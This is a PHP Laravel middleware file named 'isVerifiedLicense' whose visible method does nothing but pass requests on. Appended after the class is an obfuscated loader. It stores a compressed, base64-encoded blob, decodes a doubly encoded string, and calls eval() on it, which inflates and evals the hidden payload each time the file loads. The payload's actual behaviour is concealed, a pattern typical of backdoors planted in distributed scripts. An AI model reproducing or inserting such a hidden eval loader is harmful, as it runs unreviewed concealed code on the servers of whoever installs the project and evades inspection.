<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class isVerifiedLicense
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure(\Illuminate\Http\Request): (\Illuminate\Http\Response|\Illuminate\Http\RedirectResponse)  $next
     * @return \Illuminate\Http\Response|\Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request, Closure $next)
    {
        return $next($request);
    }
}
// $SISTEMIT_COM_ENC = "pVRNa9tAEL0b/CMKoSuZWAo9yshtCS4OTZtgm0CJiyECG2pp2eqSGtc/a36QWNjDLjrosKfB0NVnXMsmhS46aDVv5s17M6jb6XaojlAwHSB8ZGw+lpLNv6gsC/FZxzjoGgQXCNdhInhxz283YcgjRbXEMmGCPzkK2Y5OOWNJLOefdKAzFAX6ddQEMxVj8A/1piiESmjRZhBqIUCJB4zVUmF2qwKkArudbR4Fc1is9qYKwMW+wgzKgNvrlS/Qg7GmRjxoCooGieFdQVzKc2pMg/3AdKwjgPkZQwxTldtOqRy1zuXaHpyKCZYYUb9PRErPaoRtuCn+OiCOUfKYwn/UrGu5laGVq/wpVAEsOQ2kmQWkhYFWbUHtwGW9Q2Vfdpm8rWqac7HGDfiAdG+R25vr0dfpaPF59I3YgxeMWlpvqpl7XqqFRfZ/T5vY9kFJaJpsSAJcG5Jcnuc9K5nesbxpYT2WlTYE/CEsdSjwu90frlBaJDVg4bluWFL0I031CiOk0on6zHiknWjjqMzVTNUgN0gxWL+vbkaZT5xcoEPepomQ+W0xHU0eRpNHMp7N7hfju+mM5JTJ0w9juXWoulKe994fCqklF+D7Pry7ujpWm5/GIMZl26BLGXM8rp6faj+K6Vj11NrAHRpvYHs2v14az1NUIs0wazl4ZJuiex2qzEllFJIThC8fdlCQGy8ajcWE2ktw3OCr4nb1T6JZGfPFPH8A";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="EL0b/CMKoSuZWAo9yshtCS4OTZtgm0CJiyECG2pp2eqSGtc/a36QWNjDLjrosKfB0NVnXMsmhS46aDVv5s17M6jb6XaojlAwHSB8ZGw+lpLNv6gsC/FZxzjoGgQXCNdhInhxz283YcgjRbXEMmGCPzkK2Y5OOWNJLOefdKAzFAX6ddQEMxVj8A/1piiESmjRZhBqIUCJ";
 ?>